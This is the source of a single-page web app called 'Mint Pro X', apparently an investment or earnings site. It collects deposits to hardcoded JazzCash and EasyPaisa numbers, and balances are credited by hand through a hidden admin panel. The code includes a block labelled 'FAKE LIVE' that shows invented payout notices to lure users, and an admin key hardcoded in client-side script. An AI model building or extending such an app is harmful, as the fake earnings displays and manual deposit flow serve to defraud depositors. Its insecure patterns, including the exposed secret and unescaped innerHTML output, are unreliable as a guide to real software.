<html>
<head>
<title>Mint Pro X</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:sans-serif;background:#0f172a;color:white;}
.header{text-align:center;padding:15px;font-size:20px;background:#020617;}
.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(15px);border-radius:15px;padding:15px;margin:10px;}
button{background:#22c55e;border:none;padding:10px;border-radius:8px;color:white;}
input,select{width:100%;padding:10px;margin:5px 0;border-radius:8px;border:none;}
.nav{position:fixed;bottom:0;width:100%;background:#020617;display:flex;justify-content:space-around;padding:10px;}
.toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#000;padding:10px;border-radius:10px;display:none;}
.status{padding:5px;border-radius:5px;font-size:12px;}
.pending{background:orange;}
.approved{background:green;}
.rejected{background:red;}
</style>
</head>

<body>

<div class="header" id="logo">💰 Mint Pro X</div>

<button onclick="logout()">Logout</button>

<div id="home">

<div class="card">Balance: <b id="bal">0</b></div>
<div class="card">VIP: <b id="vip">0</b></div>

<div class="card">
Daily Reward: <span id="timer">Ready</span><br>
<button onclick="daily()">Claim</button>
</div>

<div class="card">
Referral: <b id="ref"></b>
</div>

</div>

<div id="deposit" style="display:none">
<div class="card">
<h3>Deposit</h3>

<select id="method">
<option value="jazzcash">JazzCash</option>
<option value="easypaisa">EasyPaisa</option>
<option value="sadapay">SadaPay</option>
</select>

<div id="pay"></div>
<button onclick="copyNumber()">Copy Number</button>

<input id="amount" placeholder="Amount">
<input type="file" id="proof">

<button onclick="deposit()">Submit</button>
</div>
</div>

<div id="history" style="display:none"></div>

<div id="adminPanel" style="display:none"></div>

<div class="nav">
<button onclick="show('home')">Home</button>
<button onclick="show('deposit')">Deposit</button>
<button onclick="show('history')">History</button>
</div>

<div id="secretBox" style="display:none;position:fixed;top:40%;left:50%;transform:translate(-50%,-50%);background:#000;padding:20px;border-radius:10px;">
<input id="secretKey" placeholder="Enter Admin Key">
<button onclick="checkKey()">Login</button>
</div>

<div id="toast" class="toast"></div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc, getDocs, doc, getDoc, setDoc, updateDoc, query, where } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
import { getAuth, signInAnonymously, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

const app = initializeApp({
  apiKey:"AIzaSy...",
  authDomain:"investment-84f4e.firebaseapp.com",
  projectId:"investment-84f4e"
});

const db=getFirestore(app);
const auth=getAuth(app);

let user,isAdmin=false,attempts=0;

signInAnonymously(auth);

onAuthStateChanged(auth, async(u)=>{
  user=u;

  let refUser=doc(db,"users",u.uid);
  let snap=await getDoc(refUser);

  if(!snap.exists()){
    await setDoc(refUser,{balance:0,vip:0});
  }

  let data=(await getDoc(refUser)).data();
  bal.innerText=data.balance;
  vip.innerText=data.vip;
  ref.innerText=u.uid.slice(0,6);

  loadHistory();
});

// NAV
window.show=(id)=>{
  home.style.display="none";
  deposit.style.display="none";
  history.style.display="none";
  document.getElementById(id).style.display="block";
};

// TOAST
function toastMsg(t){
  toast.innerText=t;
  toast.style.display="block";
  setTimeout(()=>toast.style.display="none",2000);
}

// COPY
window.copyNumber=()=>{
  let num = method.value==="easypaisa"?"03379827882":"03705519562";
  navigator.clipboard.writeText(num);
  toastMsg("Copied");
};

// DEPOSIT
window.deposit=async()=>{
  await addDoc(collection(db,"requests"),{
    user:user.uid,
    amount:Number(amount.value),
    type:"deposit",
    status:"pending"
  });
  toastMsg("Deposit Sent");
};

// WITHDRAW
window.withdraw=async()=>{
  await addDoc(collection(db,"requests"),{
    user:user.uid,
    amount:Number(wamount.value),
    type:"withdraw",
    status:"pending"
  });
};

// HISTORY
async function loadHistory(){
  let q=query(collection(db,"requests"),where("user","==",user.uid));
  let snap=await getDocs(q);

  history.innerHTML="";
  snap.forEach(d=>{
    let data=d.data();

    history.innerHTML+=`
    <div class="card">
    ${data.type} - ${data.amount}
    <div class="status ${data.status}">${data.status}</div>
    </div>`;
  });
}

// DAILY
let ready=true;
window.daily=()=>{
  if(!ready){toastMsg("Wait");return;}
  ready=false;
  let t=10;
  let i=setInterval(()=>{
    t--;timer.innerText=t+"s";
    if(t<=0){clearInterval(i);timer.innerText="Ready";ready=true;}
  },1000);
};

// LOGOUT
window.logout=()=>{signOut(auth);location.reload();};

// ADMIN ACTIVATION
function activateAdmin(){
  isAdmin=true;
  adminPanel.style.display="block";
  document.body.insertAdjacentHTML("afterbegin","<div style='position:fixed;top:10px;right:10px;background:red;padding:5px;border-radius:10px;'>ADMIN</div>");
  loadAdmin();
}

// ADMIN LOAD
async function loadAdmin(){
  let snap=await getDocs(query(collection(db,"requests"),where("status","==","pending")));
  adminPanel.innerHTML="";
  snap.forEach(d=>{
    let data=d.data();

    adminPanel.innerHTML+=`
    <div class="card">
    ${data.user}<br>${data.type}<br>${data.amount}
    <input id="amt_${d.id}">
    <button onclick="approve('${d.id}')">Approve</button>
    <button onclick="reject('${d.id}')">Reject</button>
    </div>`;
  });
}

// APPROVE
window.approve=async(id)=>{
  let r=doc(db,"requests",id);
  let d=(await getDoc(r)).data();

  let uRef=doc(db,"users",d.user);
  let u=(await getDoc(uRef)).data();

  let amt=Number(document.getElementById("amt_"+id).value)||0;

  if(u.vip>=2) amt+=50;

  await updateDoc(uRef,{balance:(u.balance||0)+amt});
  await updateDoc(r,{status:"approved"});
  loadAdmin();
};

// REJECT
window.reject=async(id)=>{
  await updateDoc(doc(db,"requests",id),{status:"rejected"});
  loadAdmin();
};

// 🔐 LONG PRESS ADMIN
let pressTimer;
logo.addEventListener("mousedown",startPress);
logo.addEventListener("mouseup",cancelPress);
logo.addEventListener("touchstart",startPress);
logo.addEventListener("touchend",cancelPress);

function startPress(){
  pressTimer=setTimeout(()=>{
    secretBox.style.display="block";
    if(navigator.vibrate) navigator.vibrate(100);
  },2000);
}
function cancelPress(){clearTimeout(pressTimer);}

// SECRET KEY
window.checkKey=()=>{
  if(secretKey.value==="Mint786"){
    activateAdmin();
    secretBox.style.display="none";
  }else{
    attempts++;
    toastMsg("Wrong");
    if(attempts>=3){secretBox.style.display="none";attempts=0;}
  }
};

// 🔔 ADMIN ALERT
setInterval(async ()=>{
  if(!isAdmin) return;
  let snap=await getDocs(collection(db,"requests"));
  snap.forEach(d=>{
    if(d.data().status==="pending"){
      if(navigator.vibrate) navigator.vibrate(200);
    }
  });
},5000);

// 💰 FAKE LIVE
setInterval(()=>{
  let names=["Ali","Ahmed","Zain"];
  let amt=Math.floor(Math.random()*500);
  toastMsg(names[Math.floor(Math.random()*3)]+" earned "+amt);
},4000);

</script>

</body>
</html>
